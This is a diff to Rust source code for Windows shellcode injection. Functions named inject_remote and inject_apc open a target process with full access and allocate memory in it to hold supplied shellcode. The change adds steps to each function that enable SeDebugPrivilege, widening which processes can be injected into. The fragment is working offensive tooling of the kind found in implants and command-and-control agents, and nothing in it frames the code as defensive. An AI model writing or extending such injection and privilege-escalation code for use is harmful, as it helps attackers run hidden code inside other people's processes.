@@ -1050,6 +1050,10 @@ unsafe fn normalize_token_session(token: HANDLE) {
 
 #[cfg(target_os = "windows")]
 unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
+    let mut htok: HANDLE = 0;
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htok) != 0 {
+        enable_priv(htok, "SeDebugPrivilege"); CloseHandle(htok);
+    }
     let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
     let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -1070,6 +1074,10 @@ unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
 
 #[cfg(target_os = "windows")]
 unsafe fn inject_apc(pid: u32, sc: &[u8]) -> String {
+    let mut htok: HANDLE = 0;
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htok) != 0 {
+        enable_priv(htok, "SeDebugPrivilege"); CloseHandle(htok);
+    }
     let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
     let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
